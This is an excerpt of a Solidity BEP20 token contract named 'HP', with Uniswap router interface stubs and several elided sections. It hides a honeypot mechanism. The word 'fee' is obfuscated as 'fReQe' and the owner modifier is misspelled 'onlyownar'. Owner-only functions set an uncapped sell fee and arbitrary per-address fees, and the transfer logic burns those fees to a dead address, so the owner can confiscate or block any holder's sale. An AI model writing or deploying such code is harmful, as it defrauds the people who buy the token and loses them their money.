...
interface IUniswapV2Factory {
    ...
    function fReQeTo() external view returns (address);
    function fReQeToSetter() external view returns (address);
    ...
    function setfReQeTo(address) external;
    function setfReQeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfReQeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfReQeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfReQeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfReQeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfReQeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract HP is BEP20, Ownable {
    ...
    uint256 private _defaultSellfReQe = 0;

    uint256 private _defaultBuyfReQe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfReQe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfReQe = _value;
    }

    function setSlipfReQe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfReQe[_address] = _value;
    }

    function getSlipfReQe(address _address) external view onlyownar returns (uint256) {
        return _slipfReQe[_address];
    }


    function setMAccountfReQe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfReQe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefReQeAmount = 0;

        if (rF) {
            uint256 tradefReQe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefReQe = _defaultSellfReQe;
                }
                if (from == uniswapV2Pair) {

                    tradefReQe = _defaultBuyfReQe;
                }
            }
            if (_slipfReQe[from] > 0) {
                tradefReQe = _slipfReQe[from];
            }

            tradefReQeAmount = _Amount.mul(tradefReQe).div(100);
        }


        if (tradefReQeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefReQeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefReQeAmount);
            emit Transfer(from, _deadAddress, tradefReQeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefReQeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefReQeAmount);
        emit Transfer(from, _to, _Amount - tradefReQeAmount);
    }
